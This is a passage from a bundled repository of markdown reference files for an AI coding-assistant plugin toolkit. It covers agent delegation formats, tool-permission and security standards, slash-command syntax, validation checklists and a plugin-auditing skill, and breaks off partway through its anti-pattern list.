        "plugins/sys-core/skills/adhering-standards/references/standards-communication.md": "# Communication Standards\n\n## 1. Natural Language Delegation (Delegated Pattern)\nWhen a Command delegates to an Agent (Delegated Pattern), it must construct a structured prompt using Markdown headers. The Agent does not have access to the main chat history; it only sees the provided prompt.\n\n**Standard Delegation Structure:**\n```markdown\n# Context\n{DATA: Background variables, file paths, and raw content needed.}\n<!-- Pro-Tip: Inject dynamic state directly into the section -->\n\n# Assignment\n**Goal:** {Specific outcome required}\n\n## Instructions\n{Step-by-step guidance for the agent}\n\n## Requirements & Constraints\n{RULES: Which Skill/Reference files must be obeyed? What is forbidden?}\n\n## Quality Standards\n{Expected output format and verification criteria}\n```\n\n## 2. XML vs. Markdown usage (Law 9)\n*   **Markdown:** The PRIMARY format for **Instructions** and **Structuring Thought**.\n*   **XML:** Reserved for **Machine Signaling** and **Data Isolation**.\n    *   *Usage:* Grouping high-noise raw data (hooks), signaling tool outputs, or semantic grouping in complex inputs.\n    *   *Constraint:* Max 15 tags per scope, no deep nesting.\n\n## 3. Direct execution (Direct Pattern)\n*   **Interactive Phase:** Commands running in the foreground (Direct Pattern) may use `AskUserQuestion` for clarifications.\n*   **Execution Isolation:** Once an Agent (Delegated) is launched, **NO USER INTERACTION IS ALLOWED**. The Agent operates in Uninterrupted Flow.\n    *   If info is missing: The Agent uses `execution-core` Handoff protocols and terminates.\n",
        "plugins/sys-core/skills/adhering-standards/references/standards-security.md": "# Security & Async Standards\n\n## 1. Background Execution Safety\nAgents running in the background/async cannot ask for permissions.\n*   **Read-Only:** Agents using `Read`, `Grep`, `Glob` are always safe for background.\n*   **Write/Execute:** Agents using `Write`, `Edit`, `Bash` must use the `auto-approve` flag or be invoked in Foreground mode.\n\n## 2. Tool Restrictions\n*   **Commands:** Must use `allowed-tools` to restrict scope.\n*   **Agents:** Must specify `tools:` in frontmatter.\n*   **Skills:** You Can specify tools, which act as permission bypass.\n\n## 3. Path Traversal\n*   **Rule:** References must use `${CLAUDE_PLUGIN_ROOT}` or relative paths.\n*   **Forbidden:** Hardcoded absolute paths (e.g., `/Users/name/...`).\n\n## 4. Tool Permission Standards\n\n### Allowed Tools Declaration\n\n**When to specify `allowed-tools`:**\n- Skill needs specific permissions\n- Security restrictions required\n- Performance optimization needed\n- Background execution intended\n\n**When to omit `allowed-tools`:**\n- Skill is reference-only\n- No tool usage required\n- Full tool access acceptable\n\n### Security Principles\n\n**Follow least privilege:**\n- Grant only necessary tools\n- Consider execution context (foreground vs. background)\n- Validate all inputs\n- Sanitize all outputs\n\n## 5. Cross-Platform Compatibility\n\n### Platform-Specific Considerations\n\n**File System Differences:**\n- Use forward slashes (/) in paths for cross-platform compatibility\n- Avoid hardcoded directory separators\n- Use environment variables for user-specific paths\n\n**Shell Command Compatibility:**\n- Use POSIX-compliant commands when possible\n- Avoid platform-specific shell syntax\n- Test commands across different platforms\n\n**Python Script Compatibility:**\n- Specify Python version requirements in scripts\n- Use cross-platform libraries\n- Avoid OS-specific imports (use pathlib instead of os.path for paths)\n\n## 6. Error Handling & Security\n\n### Graceful Degradation\n\n**When external dependencies fail:**\n- Log the failure securely (no sensitive data)\n- Provide fallback behavior\n- Document limitations\n- Continue if possible\n\n### Error Messages\n\n**Good error messages:**\n- Specific about what failed\n- Explain why it failed\n- Suggest how to fix\n- Include relevant context\n- Never expose sensitive information\n\n**Example:**\n```\n \"Failed to create skill\"\n \"Failed to create skill: Directory 'my-skill' already exists at .claude/skills/my-skill. Remove existing directory or use different name.\"\n```\n\n### Security Considerations\n\n**Input Validation:**\n- Validate all user inputs\n- Sanitize file paths\n- Check for directory traversal attempts\n- Limit input length and complexity\n\n**Output Sanitization:**\n- Escape special characters in generated files\n- Validate generated YAML\n- Check file permissions\n- Ensure no sensitive data leakage\n\n## 7. Template Usage Security\n\n### Template Customization\n\n**Allowed customizations:**\n- Content within sections\n- Additional sections\n- Custom success criteria\n- Specialized validation\n\n**Prohibited customizations:**\n- Removing required YAML fields\n- Breaking directory structure\n- Violating naming conventions\n- Introducing security vulnerabilities\n\n## 8. Dependency Management Security\n\n### When modifying skills that other components depend on:\n\n1. Identify all dependents:\n   - Agents listing this skill\n   - Commands invoking this skill\n   - Other skills referencing this skill\n\n2. Assess security impact:\n   - Will changes introduce new vulnerabilities?\n   - Are security boundaries maintained?\n   - Is least privilege preserved?\n\n3. Update dependents:\n   - Update agent skill bindings\n   - Update command invocations\n   - Update skill references\n\n### Breaking Changes Security\n\n**When introducing breaking changes:**\n1. Document the security implications\n2. Provide migration guide\n3. Update all dependents\n4. Increment version (if versioned)\n5. Communicate to users\n\n## 9. Integration Security\n\n### Slash Command Integration\n\n**When creating slash commands:**\n- Validate argument inputs\n- Sanitize command execution\n- Check file permissions\n- Log security-relevant events\n\n### Agent Binding Security\n\n**When agents should use skills:**\n- Verify skill permissions are compatible\n- Ensure least privilege maintained\n- Check tool access boundaries\n- Validate execution context\n\n**Skill binding in agents:**\n```yaml\n---\nskills: [toolkit-registry, builder-core, plan-execution]\n---\n```\n\n## 10. Testing Security\n\n### Security Testing\n\n**Skills should include:**\n- Input validation tests\n- Permission boundary tests\n- Path traversal protection tests\n- Cross-platform compatibility tests\n\n### Integration Testing\n\n**Test with:**\n- Different execution contexts (foreground/background)\n- Various permission levels\n- Edge cases and malicious inputs\n- Cross-platform scenarios\n",
        "plugins/sys-core/skills/adhering-standards/references/syntax-guide.md": "# Slash Command Syntax Guide\n\n## 1. Frontmatter Reference\n\n| Field | Type | Purpose | Required |\n|-------|------|---------|----------|\n| `description` | string | Command purpose (shown in `/help`) | **Yes** |\n| `allowed-tools` | array | **Restrict** tool access (default: inherits all) | No |\n| `argument-hint` | string | Autocomplete hint: `[optional] <required>` | No |\n| `model` | string | Specific model (e.g., `claude-3-5-haiku-20241022`) | No |\n| `disable-model-invocation` | boolean | Set `true` for user wrappers (prevents AI auto-call) | No |\n\n### `allowed-tools` Patterns\n- `[Read, Edit, Task]` - List of specific tools.\n- `Bash(git status:*)` - Prefix-matched shell commands (required if using `!` logic).\n- `WebFetch(domain:github.com)` - Domain-restricted fetching.\n\n---\n\n## 2. Arguments Reference\n\n| Variable | Scope | Usage |\n|----------|-------|-------|\n| `$ARGUMENTS` | String | Captures all arguments as a single string |\n| `$1, $2, $n` | Positional | Access specific arguments individually |\n| `${ARGUMENTS:-.}` | Shell Default | Uses `.` if arguments are empty |\n\n### Usage Patterns\n- **File Reference**: `@ $ARGUMENTS` or `@ $1`\n- **Dynamic Context**: `Current status: ! git status` (requires `Bash` in `allowed-tools`)\n- **Bash Logic**: `! npm test && npm run deploy`\n\n---\n\n## 3. Semantic Categories\n\nCat Toolkit uses semantic naming for predictability and better AI routing.\n\n| Category | Goal | Interface | Trigger Phrase |\n|----------|------|-----------|----------------|\n| **Verbs** | Load Skill | Load | \"Shortcut to load the {skill} skill for {purpose}\" |\n| **Personas** | Delegate | Task | \"[Personas] Delegate to {agent-name} for {purpose}\" |\n| **Objects** | Lifecycle | Manage | \"Shortcut to load the {skill} skill for managing {object}\" |\n| **Execution** | Run Artifact | Run | \"Shortcut to load the {skill} skill for executing {artifact}\" |\n\n### Wrapper Convention\nWrapper commands (Manually triggered by human, delegating to AI tools) MUST use:\n- `disable-model-invocation: true`\n- `allowed-tools: [Task]` (for Personas) or `allowed-tools: [Skill(skill_name)]` (for Verbs/Objects)\n",
        "plugins/sys-core/skills/adhering-standards/references/validation.md": "# Validation Protocol\n\n## Component Validation\n\nAny component MUST pass validation before deployment:\n\n### Skills Validation\n- [ ] Valid YAML frontmatter\n- [ ] Description starts with \"USE when\"\n- [ ] `allowed-tools` specified (or explicitly omitted)\n- [ ] Templates selected correctly\n- [ ] Progressive disclosure applied if complex\n- [ ] References organized in `references/`\n\n### Commands Validation\n- [ ] Valid YAML frontmatter\n- [ ] Orchestrates 2+ distinct Skills (not single-skill wrapper)\n- [ ] Clear, specific description\n- [ ] Semantic category selected\n- [ ] Tool restrictions added (if needed)\n- [ ] Tested with real invocation\n\n### Agents Validation\n- [ ] Valid YAML frontmatter\n- [ ] Description optimized for routing\n- [ ] Tool restrictions (least privilege)\n- [ ] Well-structured system prompt\n- [ ] Model selection appropriate\n- [ ] AskUserQuestion only in coordinators, not workers\n\n## Best Practices\n\n### For Skills\n\n1. **Inline-First:** Default to inline execution for quota efficiency\n2. **Fork Only When:** Task exceeds context window OR strict isolation needed\n3. **Progressive Disclosure:** Keep SKILL.md < 400 lines, move details to `references/`\n4. **Template-Driven:** Always use templates from `assets/templates/`\n\n### For Commands\n\n1. **Multi-Skill Orchestration:** Commands should sequence 2+ skills\n2. **User-Centric:** Design for human convenience, not programmatic APIs\n3. **Autonomous Execution:** Avoid interactive prompts; make decisions automatically\n4. **Argument Integration:** Use `$ARGUMENTS` for user input\n\n### For Agents\n\n1. **Persona Binding:** Design agents to be bound to Skills via `agent:` field\n2. **Least Privilege:** Specify `tools` whitelist for security\n3. **Background Safety:** Read-only tools (Read, Grep, Glob) for background execution\n4. **No AskUser in Workers:** Remove `AskUserQuestion` from worker agent `tools`\n\n## Integration Points\n\n- **standards-communication.md** - Common principles for all components\n- **scaffold-component** - Natural language to component generation\n- **meta-builder** - Live documentation fetching for compliance\n- **validate-toolkit** - Comprehensive testing and validation\n\n## Continuous Improvement\n\n### Refactoring Triggers\n\n**Consider refactoring when:**\n- Component becomes too complex\n- Usage patterns change\n- New patterns emerge\n- Standards evolve\n\n### Refactoring Principles\n\n- Enforce clean breaks over backward compatibility (Codebase > History)\n- Preserve core functionality\n- Improve clarity and usability\n- Reduce complexity\n- Enhance maintainability\n",
        "plugins/sys-core/skills/auditing-plugins/SKILL.md": "---\nname: auditing-plugins\ndescription: \"Comprehensive plugin auditing for compliance with marketplace best practices. MUST Use when validating, refactoring, or improving plugin quality. Do not use for creating new plugins, scaffolding components, or development tasks.\"\nallowed-tools: [Read, Grep, Glob, Bash]\n---\n\n# Plugin Audit Protocol\n\n\n\n### 2. Issue Detection & Classification\n\n**Critical Issues (Fix Immediately):**\n- Unrestricted Bash permissions in Agents\n- Missing `disable-model-invocation` in Commands (if marketplace requires)\n- Hardcoded paths between Skills (no deep linking)\n- Missing frontmatter fields (name, description)\n\n**Major Issues (Fix Soon):**\n- SKILL.md files exceeding marketplace size limits without progressive disclosure\n- Commands with embedded logic (not simple wrappers)\n- Inconsistent naming conventions\n- Missing reference links\n\n**Minor Issues (Fix When Convenient):**\n- Typos in descriptions\n- Inconsistent formatting\n- Missing optional metadata fields\n\n### 3. Audit Process\n\n1. **Discover Marketplace Guidelines**\n   - Read marketplace README or documentation\n   - Identify specific standards and patterns\n   - Understand validation requirements\n   - Note marketplace-specific naming conventions\n\n2. **Scan Frontmatter**\n   - Validate name, description fields\n   - Check tool permissions and whitelists\n   - Verify frontmatter structure per marketplace standards\n\n3. **Analyze Architecture**\n   - Identify Skills without progressive disclosure\n   - Check for deep linking between Skills\n   - Verify Command wrapper patterns\n   - Compare against marketplace patterns\n\n4. **Security Review**\n   - Scan for unrestricted permissions\n   - Validate tool usage per marketplace security model\n   - Check for forbidden patterns in marketplace docs\n\n5. **Compliance Check**\n   - Run marketplace's validation tools\n   - Review all validation errors and warnings\n   - Prioritize fixes by severity\n   - Cross-reference with marketplace checklist\n\n## Audit Methodology\n\n### Step 1: Marketplace Discovery\nBefore auditing, gather marketplace context:\n\n```\n1. Read: MARKETPLACE_README.md or docs/ directory\n2. Identify: Marketplace-specific standards document\n3. Note: Naming conventions and patterns\n4. Understand: Validation tools and processes\n5. Check: Example plugins for reference\n```\n\n### Step 2: Pattern Recognition\nAdapt your audit to marketplace conventions:\n\n- **Description Patterns:** Some marketplaces use Standard pattern, others Enhanced\n- **File Organization:** Check if marketplace has specific directory structure requirements\n- **Validation Tools:** Identify and use marketplace-specific validators\n- **Size Limits:** Note SKILL.md line count limits per marketplace standards\n\n### Step 3: Comprehensive Scan\nApply marketplace-validated standards:\n\n```\n1. Frontmatter validation (name, description, required fields)\n2. Permission model validation (per marketplace security model)\n3. Architecture compliance (progressive disclosure, wrapper patterns)\n4. Reference integrity (all links valid)\n5. Marketplace-specific requirements\n```\n\n### Step 4: Issue Prioritization\nClassify issues by marketplace impact:\n\n- **Critical:** Breaks marketplace requirements or security\n- **Major:** Violates marketplace best practices\n- **Minor:** Cosmetic or style issues\n\n## Output Format\n\n**For Each Issue:**\n```\n## [SEVERITY] Issue Name\n**Location:** file_path\n**Description:** What is wrong\n**Marketplace Impact:** How this affects marketplace compliance\n**Fix:** Specific steps to resolve\n**Reference:** Marketplace documentation section\n```\n\n**Summary:**\n```\n## Audit Summary\n- Total Issues: N\n- Critical: N\n- Major: N\n- Minor: N\n- Files Audited: N\n- Marketplace Guidelines Applied: [list]\n- Validation Tools Used: [list]\n```\n\n## Reference Resources\n\n- **See:** [checklist.md](references/checklist.md) - Adaptable validation checklist template\n- **See:** [patterns.md](references/patterns.md) - Common anti-patterns and fixes\n- **See:** [marketplace-customization.md](references/marketplace-customization.md) - How to adapt to different marketplaces\n- **See:** [security.md](references/security.md) - Security best practices\n- **See:** [compliance.md](references/compliance.md) - Compliance framework\n\n## Marketplace Adaptation\n\nEach marketplace may have unique requirements:\n\n- **Documentation Location:** Some put guidelines in README.md, others in docs/ directory\n- **Validation Tools:** Different marketplaces use different validators\n- **Patterns:** Some require Standard descriptions, others Enhanced\n- **File Organization:** Directory structure may vary\n- **Size Limits:** SKILL.md limits may differ\n\nAlways adapt your audit process to the specific marketplace you're working with.\n",
        "plugins/sys-core/skills/auditing-plugins/references/checklist.md": "# Adaptable Audit Checklist Template\n\n## Customize for Your Marketplace\n\nThis checklist is a **template** that should be adapted to your specific marketplace's standards and requirements.\n\n---\n\n## Phase 1: Discover Marketplace Standards\n\n### Documentation Discovery\n- [ ] Located marketplace documentation (README.md, docs/, guidelines/)\n- [ ] Identified marketplace-specific standards document\n- [ ] Found example plugins for reference\n- [ ] Understood validation tools and processes\n- [ ] Noted marketplace naming conventions\n\n### Pattern Recognition\n- [ ] Description pattern: Standard or Enhanced (or marketplace-specific)\n- [ ] Naming convention: kebab-case, snake_case, camelCase, etc.\n- [ ] File organization requirements\n- [ ] Size limits (if any)\n- [ ] Required vs optional metadata fields\n\n---\n\n## Phase 2: Frontmatter Validation\n\n### Required Fields (Per Marketplace)\n- [ ] `name` field present and matches directory name\n- [ ] `description` field present (length per marketplace standards)\n- [ ] All marketplace-required fields present\n\n### Naming Conventions (Per Marketplace)\n- [ ] `name` follows marketplace naming convention\n- [ ] Directory name matches `name` field exactly\n- [ ] No prohibited characters in `name`\n\n### Skills-Specific\n- [ ] `allowed-tools` uses correct syntax (parentheses vs brackets)\n- [ ] `user-invocable` (if present) follows marketplace format\n- [ ] No forbidden fields per marketplace standards\n\n### Commands-Specific\n- [ ] `description` field present\n- [ ] `disable-model-invocation` (if marketplace requires)\n- [ ] `argument-hint` (if marketplace uses it)\n\n### Agents-Specific\n- [ ] `tools` list is explicit (never inherited from parent)\n- [ ] Tools use marketplace-approved syntax\n- [ ] Worker agents don't have AskUserQuestion (if marketplace forbids)\n- [ ] No forbidden fields per marketplace standards\n\n---\n\n## Phase 3: Security Validation\n\n### Permission Model (Per Marketplace)\n\n**Bash Permissions (if marketplace requires restriction):**\n- [ ] No unrestricted `Bash` tool specification\n- [ ] Bash commands scoped with wildcards: `Bash(git:*)`\n- [ ] Permissions match marketplace security model\n\n**Tool Whitelists:**\n- [ ] All Agents have explicit `tools` list (if marketplace requires)\n- [ ] No Agent relies on inherited permissions (if marketplace forbids)\n- [ ] Tools follow marketplace's least privilege model\n\n**AskUserQuestion Restrictions:**\n- [ ] Worker agents follow marketplace's AskUserQuestion policy\n- [ ] Director/Coordinator agents (if marketplace has them) follow guidelines\n- [ ] All other agents follow marketplace restrictions\n\n**Forbidden Patterns (Check Marketplace Documentation):**\n- [ ] No runtime permission flags in frontmatter (if marketplace forbids)\n- [ ] No hardcoded paths to other Skills\n- [ ] No bracket syntax (if marketplace requires parentheses)\n- [ ] No relative paths across plugins (if marketplace forbids)\n\n---\n\n## Phase 4: Architecture Compliance\n\n### Skills Size Limits (Per Marketplace)\n- [ ] SKILL.md follows marketplace size limits\n- [ ] If size exceeded, progressive disclosure implemented\n- [ ] Heavy content moved to marketplace-approved locations\n\n### Progressive Disclosure (Per Marketplace Standard)\n- [ ] SKILL.md contains overview only (if marketplace prefers)\n- [ ] Detailed examples in marketplace-approved directory\n- [ ] Implementation guides properly located\n- [ ] Templates in marketplace's asset location\n\n### Commands Patterns (Per Marketplace)\n- [ ] Commands follow marketplace's wrapper pattern\n- [ ] Commands invoke Skills, don't implement workflows\n- [ ] Commands have marketplace-required flags\n- [ ] NO embedded logic in Commands (if marketplace forbids)\n\n### Reference Links (Per Marketplace Convention)\n- [ ] All references follow marketplace link convention\n- [ ] No broken links to marketplace resources\n- [ ] No deep linking between components (if marketplace forbids)\n\n---\n\n## Phase 5: Code Quality\n\n### Content Quality\n- [ ] No placeholder text: `{TEMPLATE}`, `{TODO}`\n- [ ] No TODO comments without follow-up\n- [ ] Examples are complete and functional\n- [ ] Documentation is up-to-date\n\n### Consistency\n- [ ] Similar Skills follow marketplace patterns\n- [ ] Terminology is consistent across codebase\n- [ ] Formatting follows marketplace standards\n\n---\n\n## Phase 6: Validation Tools\n\n### Marketplace-Specific Automated Checks\n- [ ] Marketplace's validator passes with 0 errors\n- [ ] All fixable issues resolved\n- [ ] Marketplace-specific linters pass\n- [ ] CI/CD pipeline passes (if applicable)\n\n### Generic Validation (If No Marketplace Tool)\n- [ ] Markdown linter passes\n- [ ] YAML parser validates\n- [ ] Links are valid\n- [ ] File encoding is correct\n\n### Manual Review\n- [ ] Security-critical changes reviewed\n- [ ] Breaking changes identified\n- [ ] Migration guide provided (if needed)\n- [ ] Marketplace compliance verified\n\n---\n\n## Severity Classification (Adapt to Your Marketplace)\n\n### Critical (Fix Immediately)\n- Breaks marketplace security requirements\n- Missing marketplace-required fields\n- Violates marketplace forbidden patterns\n- Fails marketplace validation tools\n\n### Major (Fix Within Sprint)\n- Violates marketplace best practices\n- Doesn't follow marketplace conventions\n- Missing progressive disclosure (if marketplace requires)\n- Inconsistent with marketplace patterns\n\n### Minor (Fix When Convenient)\n- Typos in descriptions\n- Inconsistent formatting\n- Missing optional metadata fields\n- Suboptimal but functional implementations\n\n---\n\n## Customization Notes\n\n### Add Your Marketplace-Specific Checks\n\n```markdown\n## [MARKETPLACE_NAME] Specific Requirements\n\n### Custom Frontmatter\n- [ ] Marketplace-specific field X present\n- [ ] Field Y follows format: [FORMAT]\n\n### Custom Architecture\n- [ ] Directory structure: [MARKETPLACE_STRUCTURE]\n- [ ] File naming: [MARKETPLACE_NAMING]\n- [ ] Reference style: [MARKETPLACE_STYLE]\n\n### Custom Security\n- [ ] Permission model: [MARKETPLACE_MODEL]\n- [ ] Required whitelists: [MARKETPLACE_LIST]\n- [ ] Forbidden patterns: [MARKETPLACE_FORBIDDEN]\n\n### Custom Validation\n- [ ] Tool: [MARKETPLACE_VALIDATOR]\n- [ ] Command: [VALIDATION_COMMAND]\n- [ ] CI/CD: [CI_INTEGRATION]\n```\n\n---\n\n## Quick Reference\n\n### Validation Commands (Customize for Your Marketplace)\n\n**Run Marketplace Validator:**\n```bash\n# Replace with your marketplace's validator\n[MARKETPLACE_VALIDATOR] [PLUGIN_PATH]\n```\n\n**Auto-fix Issues:**\n```bash\n# If your marketplace provides auto-fix\n[MARKETPLACE_VALIDATOR] --fix\n```\n\n**Check File Size:**\n```bash\n# Adapt to your marketplace's size requirements\nwc -l [PLUGIN_DIR]/*/skills/*/SKILL.md | sort -nr | head -20\n```\n\n---\n\n## Remember\n\n**This checklist is a starting point.**\n\nYour marketplace may have:\n- Different required fields\n- Different validation tools\n- Different security models\n- Different architectural patterns\n\n**Always consult your marketplace's documentation** and customize this checklist accordingly.\n",
        "plugins/sys-core/skills/auditing-plugins/references/compliance.md": "# Compliance Framework\n\n## Overview\nCompliance standards for the Cat Toolkit Marketplace.\n\n## Requirements\n1. **Protocol over Persona**: No roleplaying.\n2. **Token Efficiency**: Concise instructions.\n3. **Atomic Capabilities**: Focused skills.\n4. **Hub and Spoke**: centralized documentation.\n\n## Verification\n- Run `toolkit.py`\n- Verify against `CLAUDE.md` standards\n",
        "plugins/sys-core/skills/auditing-plugins/references/marketplace-customization.md": "# Marketplace Customization Guide\n\n## Adapting the Audit Process\n\nThis skill is designed to be **marketplace-agnostic** and adaptable to different plugin ecosystems. Follow this guide to customize your audit process for your specific marketplace.\n\n---\n\n## Step 1: Discover Your Marketplace's Standards\n\n### Find the Documentation\nDifferent marketplaces organize their documentation differently:\n\n**Common Locations:**\n```\n- MARKETPLACE_README.md\n- README.md (marketplace root)\n- docs/ directory\n- guidelines/ directory\n- STANDARDS.md\n- CONTRIBUTING.md\n```\n\n**What to Look For:**\n- Naming conventions (kebab-case, camelCase, etc.)\n- Description pattern requirements (Standard vs Enhanced)\n- File organization standards\n- Validation tools and commands\n- Security requirements\n\n### Identify Key Documents\n\n**Standards Document:**\n- Contains official marketplace standards\n- Defines required vs optional fields\n- Lists forbidden patterns\n- Describes validation process\n\n**Examples Directory:**\n- Shows properly formatted plugins\n- Demonstrates marketplace patterns\n- Provides reference implementations\n\n**Validation Tools:**\n- Scripts to check compliance\n- Automated linters or validators\n- CI/CD integration guides\n\n---\n\n## Step 2: Customize the Audit Checklist\n\n### Adapt to Your Marketplace\n\nThe base checklist is generic. Customize it for your marketplace:\n\n```markdown\n## Marketplace-Specific Requirements\n\n### Your Marketplace's Standards\n- [ ] Frontmatter follows YOUR_MARKETPLACE naming convention\n- [ ] Descriptions use YOUR_MARKETPLACE pattern (Standard/Enhanced)\n- [ ] Files organized per YOUR_MARKETPLACE structure\n- [ ] Validation passes YOUR_MARKETPLACE's tools\n- [ ] Security model follows YOUR_MARKETPLACE requirements\n```\n\n### Customization Template\n\n```markdown\n## [MARKETPLACE_NAME] Custom Checks\n\n### Phase 1: Marketplace-Specific Frontmatter\n- [ ] Required field X present\n- [ ] Optional field Y follows format\n- [ ] Description matches [MARKETPLACE_PATTERN]\n- [ ] Name follows [NAMING_CONVENTION]\n\n### Phase 2: Marketplace Architecture\n- [ ] Directory structure matches [MARKETPLACE_STANDARD]\n- [ ] File size limits per [SIZE_GUIDELINES]\n- [ ] Reference links follow [LINK_CONVENTION]\n\n### Phase 3: Marketplace Security\n- [ ] Permissions follow [SECURITY_MODEL]\n- [ ] Tool whitelists per [PERMISSION_STANDARD]\n- [ ] No forbidden patterns from [FORBIDDEN_LIST]\n\n### Phase 4: Marketplace Validation\n- [ ] Passes [VALIDATION_TOOL_1]\n- [ ] Passes [VALIDATION_TOOL_2]\n- [ ] Meets [QUALITY_THRESHOLD]\n```\n\n---\n\n## Step 3: Pattern Recognition\n\n### Marketplace Pattern Types\n\n**1. Description Patterns**\n\n*Standard Pattern (Common):*\n```yaml\ndescription: \"Provides/Creates/Implements {capability}. Use when {trigger}.\"\n```\n\n*Enhanced Pattern (Some Marketplaces):*\n```yaml\ndescription: \"Provides {capability}. {MODAL} Use when {trigger}.\"\n# Where MODAL is: MUST/SHOULD/PROACTIVELY\n```\n\n*Marketplace-Specific Pattern:*\n```yaml\ndescription: \"[YOUR_PATTERN_TYPE] - {custom format}\"\n```\n\n**2. Naming Conventions**\n\n*Common Options:*\n- kebab-case: `my-skill-name`\n- snake_case: `my_skill_name`\n- camelCase: `mySkillName`\n- PascalCase: `MySkillName`\n\n**3. File Organization**\n\n*Skill Structure Variations:*\n```\nOption A (Common):\nskills/\n  skill-name/\n    SKILL.md\n    README.md (optional)\n    references/\n    examples/\n    assets/\n\nOption B:\ncomponents/\n  skills/\n    skill-name.md\n    examples/\n      skill-name/\n\nOption C:\nplugins/\n  skill-name/\n    index.md\n    docs/\n      reference.md\n```\n\n---\n\n## Step 4: Validation Tools\n\n### Marketplace-Specific Tools\n\n**Common Validation Tools:**\n\n1. **Generic Markdown Linters:**\n   - `markdownlint`\n   - `remark`\n   - Custom regex checks\n\n2. **Schema Validators:**\n   - JSON Schema validation\n   - YAML structure validation\n   - Custom parser\n\n3. **Plugin-Specific Validators:**\n   - `marketplace-validator.py`\n   - `plugin-lint.js`\n   - `validate-plugins.sh`\n\n**How to Integrate:**\n\n```bash\n# Run marketplace's validator\n[VALIDATION_COMMAND]\n\n# Custom validator\n[YOUR_VALIDATOR] --strict\n\n# Automated checks\n[CI_TOOL] validate\n```\n\n---\n\n## Step 5: Security Models\n\n### Permission Systems Vary\n\n**Model 1: Explicit Whitelisting (Common)**\n```yaml\ntools: [Read, Write, Bash(git:*)]\n```\n\n**Model 2: Implicit with Restrictions**\n```yaml\n# Tools allowed but with runtime checks\ntools: [Read, Write, Bash]\n```\n\n**Model 3: Capability-Based**\n```yaml\ncapabilities:\n  - file-operations\n  - git-integration\n  - python-execution\n```\n\n**Adapt Security Review:**\n- Identify your marketplace's security model\n- Check for proper permission specifications\n- Validate against marketplace security requirements\n- Ensure no forbidden permission patterns\n\n---\n\n## Step 6: Common Marketplace Variations\n\n### Variation 1: Size Limits\n\n**Some Marketplaces Have Strict Limits:**\n- SKILL.md: <100 lines (progressive disclosure required)\n- SKILL.md: <500 lines (allowed but discouraged)\n- SKILL.md: No limit (flexible)\n\n**Adapt:** Check your marketplace's size requirements\n\n### Variation 2: Reference Structure\n\n**Progressive Disclosure Approaches:**\n- Heavy use of `references/` directory\n- Inline examples with collapse sections\n- External documentation links\n- Hybrid approach\n\n**Adapt:** Follow your marketplace's documentation strategy\n\n### Variation 3: Command Patterns\n\n**Command Wrapper Styles:**\n- Simple delegation: \"Invoke X skill\"\n- Orchestration: Brief workflow description\n- Full workflow: Detailed step-by-step\n- Zero-retention: With disable-model-invocation\n\n**Adapt:** Use your marketplace's preferred command style\n\n---\n\n## Quick Adaptation Checklist\n\n### Before Auditing:\n\n- [ ] Located marketplace documentation\n- [ ] Identified naming conventions\n- [ ] Understood description patterns\n- [ ] Found validation tools\n- [ ] Reviewed example plugins\n- [ ] Noted size/organization requirements\n- [ ] Understood security model\n- [ ] Customized audit checklist\n\n### During Audit:\n\n- [ ] Apply marketplace-specific patterns\n- [ ] Use marketplace validation tools\n- [ ] Check marketplace-specific requirements\n- [ ] Reference marketplace documentation\n- [ ] Validate against marketplace standards\n\n### After Audit:\n\n- [ ] Report marketplace-specific issues\n- [ ] Reference marketplace documentation\n- [ ] Provide marketplace-compliant fixes\n- [ ] Suggest marketplace-specific improvements\n\n---\n\n## Example: Adapting to Different Marketplaces\n\n### Example 1: Claude Code Plugin Marketplace\n\n**Documentation:** `/CLAUDE.md` in each plugin\n**Pattern:** Enhanced (MUST/SHOULD/PROACTIVELY)\n**Validator:** `toolkit.py`\n**Size Limit:** <500 lines (progressive disclosure recommended)\n**Security:** Explicit Bash whitelisting required\n\n### Example 2: VS Code Extension Marketplace\n\n**Documentation:** `README.md` with extension guidelines\n**Pattern:** Standard with badges\n**Validator:** `vsce validate`\n**Size Limit:** No strict limit\n**Security:** Marketplace permissions model\n\n### Example 3: Custom Enterprise Marketplace\n\n**Documentation:** Internal wiki/Confluence\n**Pattern:** Enterprise-specific (may include org standards)\n**Validator:** Custom internal tools\n**Size Limit:** 200 lines max\n**Security:** Corporate security model\n\n---\n\n## Key Principle\n\n**The audit skill is a framework, not a prescription.**\n\nAlways adapt it to your marketplace's:\n- Documentation standards\n- Validation tools\n- Security model\n- Architectural patterns\n- Quality requirements\n\nYour marketplace's documentation is the source of truth, not hardcoded patterns.\n",
        "plugins/sys-core/skills/auditing-plugins/references/patterns.md": "# Common Anti-Patterns and Fixes\n\n## Marketplace-Agnostic Framework\n\nThese anti-patterns are **common across many plugin marketplaces**. Always adapt fixes to your marketplace's specific standards and requirements.\n\n---\n\n## Critical Security Anti-Patterns\n\n### 1. Unrestricted Permission Specifications\n\n**WRONG (Most Marketplaces):**\n```yaml\ntools: [Read, Write, Edit, Bash]\n```\n\n**Why Dangerous:**\n- Agent can execute ANY shell command\n- Risk of destructive operations\n- Violates least privilege principle\n\n**CORRECT (Most Marketplaces):**\n```yaml\ntools: [\n  Read, Write, Edit,\n  Bash(git:*),\n  Bash(python:*),\n  Bash([MARKETPLACE_PACKAGE_MANAGER]:*)\n]\n```\n\n**Adaptation:** Your marketplace may have specific permission requirements. Check your marketplace's security model.\n\n---\n\n### 2. Inherited Agent Permissions\n\n**WRONG (Most Marketplaces):**\n```yaml\n# No explicit tools list - relies on inheritance\ntools: [Read, Write, Edit]  # Implicit - may inherit more\n```\n\n**Why Dangerous:**\n- Cannot predict what agent can do\n- May inherit dangerous permissions\n- Violates explicit allowlist principle\n\n**CORRECT (Most Marketplaces):**\n```yaml\ntools: [Read, Write, Edit, Bash(git:*)]\n```\n\n**Adaptation:** If your marketplace allows inheritance, check if it's documented and approved.\n\n---\n\n## Command Anti-Patterns\n\n### 3. Commands with Embedded Logic\n\n**WRONG (Most Marketplaces):**\n```yaml\n---\ndescription: \"Build the application\"\ndisable-model-invocation: true\n---\n\n# Build Command\n\nThis command will:\n1. Check if package.json exists\n2. Install dependencies\n3. Run tests\n4. Build the application\n5. Deploy to staging\n\nSteps:\n1. First, check if [MARKETPLACE_RUNTIME] is installed...\n```\n\n**Why Wrong:**\n- Command is 20+ lines with workflow\n- Contains implementation details\n- Should delegate to Skill\n\n**CORRECT (Most Marketplaces):**\n```yaml\n---\ndescription: \"Build the application using marketplace best practices.\"\ndisable-model-invocation: true  # If marketplace requires zero-token retention\n---\n\nInvoke the `[MARKETPLACE_BUILD_SKILL]` skill with \"$ARGUMENTS\"\n```\n\n**Adaptation:** Your marketplace may have specific command patterns or may not require disable-model-invocation.\n\n---\n\n### 4. Missing 